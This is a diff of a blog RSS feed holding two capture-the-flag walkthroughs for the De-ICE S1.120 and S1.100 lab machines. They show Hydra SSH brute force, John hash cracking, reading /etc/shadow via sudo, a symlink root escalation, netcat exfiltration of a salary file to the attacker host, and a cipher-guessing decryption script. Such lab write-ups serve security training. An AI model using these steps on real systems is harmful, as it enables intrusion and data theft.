+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Instead of cracking these in SQLMap, I saved the hashes to a text file and used John.  A large number of these hashes were cracked immediately.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~/de-ice/1.120# john /tmp/sqlmaphashes-BMaKet.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;ssh:1a817b9b9b67bfd1b15cedf6dcbe70ff&#34;&gt;SSH&lt;/h2&gt;
+
+&lt;p&gt;My next step was to try and use these DMBS usernames and passwords to login via SSH.  I noticed my old buddy bbanter on the this, so I tried those credentials first.  Luckily, the passwords were the same and I was granted a shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.120# ssh bbanter@192.168.1.120
+Linux 2.6.27.27.
+bbanter@slax:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A little bit of user enumeration (&lt;code&gt;/etc/passwd&lt;/code&gt; &amp;amp; &lt;code&gt;/etc/group&lt;/code&gt;) showed that no users were in a wheel or sudo group, but there was a group called admin which ccoffee was a member of.  I checked back with john and found that I had cracked his password too, so I used su to switch.&lt;/p&gt;
+
+&lt;p&gt;I checked ccoffee&amp;rsquo;s user area and sudo rights.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ccoffee@slax:~$ ls -laR
+drwx------  2 ccoffee users   80 Apr 23 12:19 scripts/
+./scripts:
+-rws--x--x 1 root    admin 110 Apr 23 11:44 getlogs.sh*
+ccoffee@slax:~$ sudo -l
+User ccoffee may run the following commands on this host:
+    (root) NOPASSWD: /home/ccoffee/scripts/getlogs.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The script here has weak permissions, and allowed ccoffee to elevate himself to root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ccoffee@slax:~$ mv scripts/getlogs.sh scripts/getlogs.sh.bkup
+ccoffee@slax:~$ ln -s /bin/bash scripts/getlogs.sh
+ccoffee@slax:~$ sudo scripts/getlogs.sh
+root@slax:~# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:1a817b9b9b67bfd1b15cedf6dcbe70ff&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;p&gt;There is no specific flag for this challenge - the ability to browse through and read the various documents in the user directories indicates this challenge is complete.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@slax:~# ls -laR /home/&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>De-ICE S1.100</title>
+      <link>http://rastamouse.me/writeups/2013/de-ice-s1-100/</link>
+      <pubDate>Sat, 12 Jan 2013 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2013/de-ice-s1-100/</guid>
+      <description>
+
+&lt;p&gt;This is a walkthrough of how I completed the De-ICE S1.100 challenge.  The end goal is to obtain the CEO&amp;rsquo;s salary information.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:7ae3df20909f7f73a6199fc5ab833e91&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.1.100
+ 
+PORT    STATE  SERVICE  VERSION
+20/tcp  closed ftp-data
+21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
+22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+|_sshv1: Server supports SSHv1
+25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
+| smtp-commands: slax.example.net Hello [192.168.1.200], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP,
+|_ 2.0.0 This is sendmail version 8.13.7 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use &amp;quot;HELP &amp;lt;topic&amp;gt;&amp;quot;. 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
+80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn&#39;t have a title (text/html).
+110/tcp open   pop3     Openwall popa3d
+143/tcp open   imap     UW imapd 2004.357
+|_imap-capabilities: CAPABILITY IDLE LOGIN-REFERRALS LITERAL+ THREAD=ORDEREDSUBJECT THREAD=REFERENCES SCAN MAILBOX-REFERRALS SORT NAMESPACE STARTTLS completed IMAP4REV1 OK AUTH=LOGINA0001 UNSELECT SASL-IR BINARY MULTIAPPEND
+443/tcp closed https
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you open up a web browser and go to 192.168.1.100, you will see a generic welcome page to the De-ICE challenge, with a link to see some hints if you get stuck.  To see the game related page, click the link at the bottom of the page and it will take you to &lt;code&gt;192.168.1.100/index2.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;This page contains some names and email addresses of employee&amp;rsquo;s.  I took a copy of this information, and used it to create a list of possible usernames.&lt;/p&gt;
+
+&lt;h2 id=&#34;hydra:7ae3df20909f7f73a6199fc5ab833e91&#34;&gt;Hydra&lt;/h2&gt;
+
+&lt;p&gt;I then attempted to use these usernames to bruteforce the SSH login.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.100# hydra -L users -e nsr 192.168.1.100 ssh
+1 of 1 target completed, 0 valid passwords found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The nsr option checks for null password, login as password and reverse login as password.  Unfortunately, none of these attempts were successful.  Before attempting to use a large dictionary, I decided to look again at my list of users.  On a hunch, I swapped the surname and first initials around, so instead of marym I had mmary etc.&lt;/p&gt;
+
+&lt;p&gt;I ran this through hydra again, but this time I got a successful hit.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[22][ssh] host: 192.168.1.100   login: bbanter   password: bbanter
+1 of 1 target successfully completed, 1 valid password found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;ssh-enumeration:7ae3df20909f7f73a6199fc5ab833e91&#34;&gt;SSH &amp;amp; Enumeration&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.100# ssh bbanter@192.168.1.100
+bbanter @ 192.168.1.100&#39;s password: 
+Linux 2.6.16.
+bbanter@slax:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This version of Linux is running an old kernel, and is therefore likely to have privilege escalation exploits available.  However there is no gcc or python installed, which would make compiling and executing such exploits difficult.&lt;/p&gt;
+
+&lt;p&gt;The passwd and group files yielded some interesting information.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bbanter@slax:~$ cat /etc/passwd 
+root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
+aadams:x:1000:10:,,,:/home/aadams:/bin/bash
+bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
+ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This confirmed that these were the only three users on the system, so I went back and removed the others from my user list.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bbanter@slax:~$ cat /etc/group 
+root::0:root
+wheel::10:root
+users::100:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I knew that bbanter and ccoffee were both members of the users (gid=100) group; and aadams was in the wheel (gid=10) group.  The wheel group traditionally allows its users sudo privileges and would therefore be a better account to attack compared to ccoffee.&lt;/p&gt;
+
+&lt;h2 id=&#34;hyrda-again:7ae3df20909f7f73a6199fc5ab833e91&#34;&gt;Hyrda (again)&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~# hydra -l aadams -P /usr/share/wordlists/passwords 192.168.1.100 ssh&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The password file I used was based on the darkc0de wordlist.  To save time, I did some manipulation on it to remove all lines that contained numbers and special characters.  It was a gamble that the password wouldn&amp;rsquo;t be too complicated.  It seems I got lucky.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;[22][ssh] host: 192.168.1.100   login: aadams   password: nostradamus&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;ssh-again:7ae3df20909f7f73a6199fc5ab833e91&#34;&gt;SSH (again)&lt;/h2&gt;
+
+&lt;p&gt;Since I was still logged in as bbanter, I used su to switch to aadams.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bbanter@slax:~$ su aadams
+Password: ***********
+aadams@slax:/home/bbanter$ id
+uid=1000(aadams) gid=10(wheel) groups=10(wheel)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My next step was to check the sudo rights of aadams.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;aadams@slax:~$ sudo -l
+User aadams may run the following commands on this host:
+    (root) NOEXEC: /bin/ls
+    (root) NOEXEC: /usr/bin/cat
+    (root) NOEXEC: /usr/bin/more
+    (root) NOEXEC: !/usr/bin/su \*root\*
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This made it a rather trivial exercise to obtain the shadow file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;aadams@slax:~$ sudo cat /etc/shadow
+root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
+aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
+bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
+ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;john-the-ripper:7ae3df20909f7f73a6199fc5ab833e91&#34;&gt;John the Ripper&lt;/h2&gt;
+
+&lt;p&gt;I copied these hashes to my machine and set &lt;code&gt;john&lt;/code&gt; to work on cracking them (excluding bbanter and aadams, I kept ccoffee in there for the sake of completeness).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/de-ice/1.100# john --rules --wordlist=/usr/share/wordlists/darkc0de.lst shadow
+tarot            (root)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Whilst john was working on these hashes, I used aadams&amp;rsquo; sudo ls rights to browse the file system and eventually came across &lt;code&gt;/home/ftp/incoming/salary_dec2003.csv.enc&lt;/code&gt;. I was able to sudo cat the file, which appeared to be in binary, but it could be piped to strings and more, to make some parts of it readable.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;aadams@slax:~$ sudo cat /home/ftp/incoming/salary_dec2003.csv.enc | strings | more&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;A little research into the string &lt;code&gt;Salted__&lt;/code&gt;, revealed this was a file encrypted using OpenSSL.&lt;/p&gt;
+
+&lt;h2 id=&#34;openssl:7ae3df20909f7f73a6199fc5ab833e91&#34;&gt;OpenSSL&lt;/h2&gt;
+
+&lt;p&gt;There are lots of options within OpenSSL for encrypting files, different ciphers etc.  To this end, I wrote a script that would attempt each cipher on the encrypted file - not forgetting the little clue in the passwd file:  &amp;ldquo;DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION&amp;rdquo;.  This indicated to me that the root password was used during the encryption and that it would be required for the decryption (good job &lt;code&gt;john&lt;/code&gt; was able to crack the hash for root).&lt;/p&gt;
+
+&lt;p&gt;To make this task a bit easier, I wanted to transfer the file to my Kali machine.  There is a (broken) FTP service running, but instead of spending time fixing that to transfer the file, I used netcat instead.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~/de-ice/1.100# nc -lnvvp 4444 &amp;gt; salary_dec2003.csv.enc&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Switch to the root user, and&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;aadams@slax:~$ su -
+Password: *****
+
+root@slax:~# cd /home/ftp/incoming/
+root@slax:/home/ftp/incoming# nc 192.168.1.200 4444 &amp;lt; salary_dec2003.csv.enc 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
+openssl=/usr/bin/openssl
+ciphers=$($openssl list-cipher-commands)
+key=tarot
+in=salary_dec2003.csv.enc
+out=salary_dec2003.csv
+for i in $ciphers; do
+        $openssl enc -d -${i} -in ${in} -k ${key} &amp;gt; /dev/null 2&amp;gt;&amp;amp;1;
+                if [[ $? == 0 ]]; then
+                $openssl enc -d -${i} -in ${in} -k ${key} -out ${out}
+                echo &amp;quot;Successfully decrypted with ${i} and ${key}&amp;quot;
+                exit 0; fi  
+done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;,1,Charles E. Ophenia,&amp;quot;$225,000.00&amp;quot;,1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$360.00,$500.00,$860.00,183200299,1123245
+,2,Marie Mary,&amp;quot;$56,000.00&amp;quot;,1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1192291
+,3,Pat Patrick,&amp;quot;$43,350.00&amp;quot;,1,1,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,2334432
+,4,Terry Thompson,&amp;quot;$27,500.00&amp;quot;,1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$225.00,$350.00,183200299,1278235
+,5,Ben Benedict,&amp;quot;$29,750.00&amp;quot;,1,3,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$122.50,$247.50,183200299,2332546
+,6,Erin Gennieg,&amp;quot;$105,000.00&amp;quot;,1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1456567
+,7,Paul Michael,&amp;quot;$76,000.00&amp;quot;,1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1446756
+,8,Ester Long,&amp;quot;$92,500.00&amp;quot;,1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1776782
+,9,Adam Adams,&amp;quot;$76,250.00&amp;quot;,1,5,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,2250900
+,10,Chad Coffee,&amp;quot;$55,000.00&amp;quot;,1,1,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1590264
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
